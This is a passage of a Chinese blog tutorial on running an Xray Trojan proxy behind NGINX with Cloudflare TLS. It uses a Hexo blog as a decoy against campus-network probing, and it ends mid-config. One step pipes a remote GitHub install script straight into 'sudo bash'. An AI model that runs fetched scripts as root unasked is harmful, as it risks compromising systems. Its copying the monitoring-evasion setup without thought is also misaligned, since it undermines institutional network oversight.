id="方法二：直接使用-Cloudflare-的免费-TLS-证书"><a href="#方法二：直接使用-Cloudflare-的免费-TLS-证书" class="headerlink" title="方法二：直接使用 Cloudflare 的免费 TLS 证书"></a>方法二：直接使用 Cloudflare 的免费 TLS 证书</h3><p>Cloudflare 提供了免费的 TLS 证书，直接创建即可：</p><p><img src="https://s2.loli.net/2024/09/11/8bKsuFVLBHNIde1.png" alt="有效期有tm的15年，这还要啥自行车！"></p><p>之后会保存下来一份 PEM 和一份 KEY 文件，我们将在后续配置 NGINX 时使用到这个东西</p><p>以及别忘了把 Cloudflare 中的 TLS 加密改为严格，否则很容易莫名其妙就 404 了：</p><p><img src="https://s2.loli.net/2024/09/12/vmE4h23kVWMw6Hr.png"></p><h2 id="NGINX-搭建"><a href="#NGINX-搭建" class="headerlink" title="NGINX 搭建"></a>NGINX 搭建</h2><blockquote><p> 这个网上教程就非常多了，笔者这里仅简略讲讲，你也可以不用参照笔者所写的这一节：）</p></blockquote><p>首先配置防火墙，开启正常网站所需的 80 和 443 端口，这里以 <code>firewalld</code> 为例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo firewall-cmd --zone=public --add-port=443/tcp --permanent</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo firewall-cmd --reload</span><br></code></pre></td></tr></table></figure><p>如果你的服务器使用的是 <code>ufw</code> ，则参照如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ufw allow 80/tcp</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ufw allow 443/tcp</span><br></code></pre></td></tr></table></figure><p>然后安装 NGINX：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> nginx</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now nginx.service</span><br></code></pre></td></tr></table></figure><p>然后简单配置一个静态网页界面作为伪装，以防万一校方进行主动探测发现情况不对，首先创建配置文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">touch</span> /etc/nginx/vhosts.d/你的域名.conf</span><br></code></pre></td></tr></table></figure><p>在文件中写入如下内容，第一个 server 是正常的 https 网站配置，第二个 server 是监听 80 端口将 http 跳转到 https，剩下两个是把未通过指定域名的访问全都返回 403 Forbidden：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">server_name</span> 你的域名;<br>        <span class="hljs-attribute">ssl_certificate</span>     你的 .pem 证书路径;<br>        <span class="hljs-attribute">ssl_certificate_key</span> 你的 .key 密钥路径;<br>        <span class="hljs-section">location</span> / &#123;<br>                <span class="hljs-attribute">root</span> 你的静态网页目录;<br>                <span class="hljs-attribute">index</span> 你的网站首页文件（例如 index.html）;<br>        &#125;<br>&#125;<br><br><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">80</span>;<br>        <span class="hljs-attribute">server_name</span> 你的域名;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">301</span> https://你的域名<span class="hljs-variable">$request_uri</span>;<br>&#125;<br><br><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span>;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span>;<br>        <span class="hljs-attribute">server_name</span> 你的IP;<br>        <span class="hljs-attribute">ssl_certificate</span>     你的 .pem 证书路径;<br>        <span class="hljs-attribute">ssl_certificate_key</span> 你的 .key 密钥路径;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>&#125;<br><br><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">80</span>;<br>        <span class="hljs-attribute">server_name</span> 你的IP;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>重启 NGINX：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart nginx.service</span><br></code></pre></td></tr></table></figure><p>之后就能正常看到我们的网站了，这里笔者随便放了一个测试页面：</p><p><img src="https://s2.loli.net/2024/09/12/bLMckeJWH6Bi2CN.png"></p><h2 id="配置-git-hexo-网页伪装（可选）"><a href="#配置-git-hexo-网页伪装（可选）" class="headerlink" title="配置 git + hexo 网页伪装（可选）"></a>配置 git + hexo 网页伪装（可选）</h2><h3 id="1️⃣-安装-hexo"><a href="#1️⃣-安装-hexo" class="headerlink" title="1️⃣ 安装 hexo"></a>1️⃣ 安装 hexo</h3><p>仅有一个空白页面的网站就像一个一碰就碎的纸老虎，校方一旦进行主动探测很容易就会发现这样一个网页并不值得有这么高的访问流量，从而直接封禁域名，因此我们还需要配置一个更加完善的静态网页作为伪装</p><p>比较容易想到的是可以把这个网站配置成一个类似个人博客这样的网站，并在上面放一些有意义的内容，这样即使手工探测也 <em>一时无法发现端倪</em> </p><blockquote><p>当然，这个做法说实话还是有点 <strong>自欺欺人</strong> 的，校园网如果真想封你难道还要挑时间看理由？</p></blockquote><p>首先是配置 hexo，细节笔者就不说了反正不少有自己博客的人大都应该尝试过（包括本站也是使用 hexo 部署的），简而言之只需要：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">注：你得先安装 nodejs，以 openSUSE 为例是 sudo zypper <span class="hljs-keyword">in</span> nodejs-common</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo npm install -g hexo</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">hexo init blog</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> blog</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">npm install</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">npm install hexo-deployer-git --save</span><br></code></pre></td></tr></table></figure><blockquote><p> 如果要在本地查看部署效果，直接 <code>hexo server</code> 即可在 <code>localhost:4000</code> 查看</p></blockquote><h3 id="2️⃣-推送远程"><a href="#2️⃣-推送远程" class="headerlink" title="2️⃣ 推送远程"></a>2️⃣ 推送远程</h3><p>现在我们来看如何部署在远程服务器，这里笔者推荐使用 git 进行部署（ <del>因为看了一圈其他部署方式要么年久失修要么需要额外开端口要么要开启密码验证，不太安全</del> ），首先我们在远程服务器上安装 Git 并配置一个新的 git 用户：</p><blockquote><p>注：其实也可以直接用个人账户，不一定要新建一个 <code>git</code> 用户</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo groupadd git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo useradd -m -s /bin/bash -g git git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo passwd git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">su git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> ~/.ssh</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;你的公钥&quot;</span> &gt; ~/.ssh/authorized_keys</span><br></code></pre></td></tr></table></figure><p>创建空白 git 仓库，并添加 hook 执行权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git init --bare ~/blog.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">touch</span> ~/blog.git/hooks/post-receive</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x ~/blog.git/hooks/post-receive</span><br></code></pre></td></tr></table></figure><p>然后修改 git 仓库目录下的 <code>hooks/post-receive</code> 文件写入如下内容以配置推送上来的文件存放的目录（别忘了给相应文件夹访问权限）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git --work-tree=/srv/www/hexo-blog --git-dir=/home/git/blog.git checkout -f<br></code></pre></td></tr></table></figure><p>然后修改 hexo blog 文件夹根目录的 <code>_config.yml</code> ，在末尾添加 git 相关配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">deploy:<br>  type: git<br>  repo: git@你的ssh域名:~/blog.git<br></code></pre></td></tr></table></figure><p>然后运行如下<del>熟悉得不能再熟悉的</del>命令进行推送：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">hexo d -g</span><br></code></pre></td></tr></table></figure><p>最后修改 NGINX 配置里的静态网页目录：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">server_name</span> 你的域名;<br>        <span class="hljs-attribute">ssl_certificate</span>     你的 .pem 证书路径;<br>        <span class="hljs-attribute">ssl_certificate_key</span> 你的 .key 密钥路径;<br>        <span class="hljs-section">location</span> / &#123;<br>                <span class="hljs-attribute">root</span> /srv/www/hexo-blog;<br>                <span class="hljs-attribute">index</span> index.html;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>重启 NGINX：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart nginx.service</span><br></code></pre></td></tr></table></figure><p>然后就能正常看到 hexo 博客页面了：</p><p><img src="https://s2.loli.net/2024/09/18/VtjC975S2bqUHgs.png"></p><blockquote><p>更换主题后可能会碰到套 CDN 的地址访问发现样式表炸了的问题，可能是缓存没刷新，稍微等一等就好（几十分钟到几小时？）</p></blockquote><h2 id="配置-XRAY-Trojan-代理"><a href="#配置-XRAY-Trojan-代理" class="headerlink" title="配置 XRAY Trojan 代理"></a>配置 XRAY Trojan 代理</h2><p>总算到了安装真正的代理工具的时候，这里笔者选择 Xray 作为代理软件，代理协议出于安全起见选择 Trojan</p><h3 id="方法1️⃣：使用-Docker-进行部署（推荐）"><a href="#方法1️⃣：使用-Docker-进行部署（推荐）" class="headerlink" title="方法1️⃣：使用 Docker 进行部署（推荐）"></a>方法1️⃣：使用 Docker 进行部署（推荐）</h3><p>安全起见，笔者推荐使用 Docker 部署，这同时也消除了发行版之间的差异性可能导致的部署失败（例如说你可能喜欢在自己的服务器上使用奇奇怪怪的发行版）</p><p>首先编写配置文件 <code>config.json</code> ：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;容器内的日志地址，例如/var/log/xray/error.log&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;容器内的日志地址，例如/var/log/xray/access.log&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 你的自定义的xray本地监听端口，例如<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;clients&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你自己想一个密码&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/自己设定的路径&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;rules&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;bittorrent&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blocked&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>然后写 Dockerfile：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> debian:latest<br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get upgrade -y</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y curl wget unzip procps</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget -P /root/ https://github.com/XTLS/Xray-core/releases/download/v24.11.5/Xray-linux-64.zip</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> unzip /root/Xray-linux-64.zip -d /root/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/xray</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ./config.json /root/config.json</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\n/root/xray run -config /root/config.json\nsleep infinity&quot;</span> &gt; /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> -p /var/log/xray</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -sf ../usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>这两个文件放同一个目录下，运行如下命令创建镜像并启动容器即可，方便起见这里直接使用整个服务器网络，你也可以选择自行配置端口转发：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t a3xray .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --name=a3xray --network=host a3xray</span><br></code></pre></td></tr></table></figure><p>使用如下命令配置容器自启动（毕竟有的时候系统更新或许会需要你重启，<del>当然你也可以选择直接买 RedHat 或是 SUSE 的 kernel live patch 服务以避免这个需要</del> ）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker update --restart=always a3xray</span><br></code></pre></td></tr></table></figure><h3 id="方法2️⃣：使用官方安装脚本"><a href="#方法2️⃣：使用官方安装脚本" class="headerlink" title="方法2️⃣：使用官方安装脚本"></a>方法2️⃣：使用官方安装脚本</h3><p>你也可以选择使用官方所给的安装脚本进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo bash -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)</span>&quot;</span> @ install</span><br></code></pre></td></tr></table></figure><p>接下来随便生成一个 uuid 作为密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">xray uuid</span><br></code></pre></td></tr></table></figure><p>接下来编辑配置文件 <code>/usr/local/etc/xray/config.json</code> ，写入如下内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的日志地址，例如/var/log/xray/error.log，别忘了给权限&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的日志地址，例如/var/log/xray/access.log，别忘了给权限&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 你的自定义的xray本地监听端口，例如<span class="hljs-number">11451</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;clients&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你自己想一个密码&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/自己设定的路径&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span> <span 